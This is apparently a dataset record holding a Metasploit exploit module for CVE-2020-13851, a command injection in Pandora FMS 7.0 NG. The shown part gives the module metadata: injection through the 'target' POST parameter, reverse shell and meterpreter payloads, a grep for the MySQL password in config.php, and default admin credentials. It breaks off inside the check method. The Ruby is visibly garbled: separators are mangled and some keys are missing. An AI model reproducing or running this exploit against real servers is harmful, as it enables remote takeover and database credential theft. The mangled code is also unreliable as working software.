{
    "text": "vul_name : Pandora FMS 7.0 NG 7X Remote Command Execution ， vul_cve : CVE-2020-13851 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : CmdStager ， prepend Msf : Exploit : Remote : AutoCheck ， super (  ， update_info (  ， info ,  ， 'Name' => 'Pandora FMS Events Remote Command Execution' ,  ， 'Description' => %q{ ， This module exploits a vulnerability ( CVE-2020-13851 ) in Pandora ， FMS versions 7.0 NG 742 , 7.0 NG 743 , and 7.0 NG 744 ( and perhaps ， older versions ) in order to execute arbitrary commands. ， This module takes advantage of a command injection vulnerability in the ， `Events` feature of Pandora FMS. This flaw allows users to execute ， arbitrary commands via the `target` parameter in HTTP POST requests to ， the `Events` function. After authenticating to the target , the module ， attempts to exploit this flaw by issuing such an HTTP POST request ,  ， with the `target` parameter set to contain the payload. If a shell is ， obtained , the module will try to obtain the local MySQL database ， password via a simple `grep` command on the plaintext ， `/var/www/html/pandora_console/include/config.php` file. ， Valid credentials for a Pandora FMS account are required. The account ， does not need to have admin privileges. ， This module has been successfully tested on Pandora 7.0 NG 744 running ， on CentOS 7 ( the official virtual appliance ISO for this version ) . ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'Fernando Catoira' ,  # Discovery ， 'Julio Sanchez' ,  # Discovery ， 'Erik Wynter' #  @ wyntererik - Metasploit ，  ]  ,  ， ' ，  [  ，  [ 'CVE' , '2020-13851' ]  ,  # RCE via the `events` feature ，  [ 'URL' , ' ，  ]  ,  ， 'Platform' => [ 'linux' , 'unix' ]  ,  ， 'Arch' => [ ARCH_X86 , ARCH_X64 , ARCH_CMD ]  ,  ， 'Targets' => ，  [  ，  [  ， 'Linux ( x86 ) ' , { ， 'Arch' => ARCH_X86 ,  ， 'Platform' => 'linux' ,  ， 'DefaultOptions' => { ， 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' ， } ， } ，  ]  ,  ，  [  ， 'Linux ( x64 ) ' , { ， 'Arch' => ARCH_X64 ,  ， 'Platform' => 'linux' ,  ， 'DefaultOptions' => { ， 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' ， } ， } ，  ]  ,  ，  [  ， 'Linux ( cmd ) ' , { ， 'Arch' => ARCH_CMD ,  ， 'Platform' => 'unix' ,  ， 'DefaultOptions' => { ， 'PAYLOAD' => 'cmd/unix/reverse_bash' ， } ， } ，  ]  ，  ]  ,  ， 'Privileged' => false ,  ， 'DisclosureDate' => '2020-06-04' ,  ， 'DefaultTarget' => 1 ， register_options [  ， OptString.new ( 'TARGETURI' ,  [ true , 'Base path to Pandora FMS' , '/pandora_console/' ]  )  ,  ， OptString.new ( 'USERNAME' ,  [ true , 'Username to authenticate with' , 'admin' ]  )  ,  ， OptString.new ( 'PASSWORD' ,  [ true , 'Password to authenticate with' , 'pandora' ]  )  ，  ]  ， end ， def check ， vprint_status ( 'Running check' )  ， res = send_request_cgi 'uri' => normalize_uri ( target_uri.path , 'index.php' )  ， unless res",
    "time": "2020.07.12"
}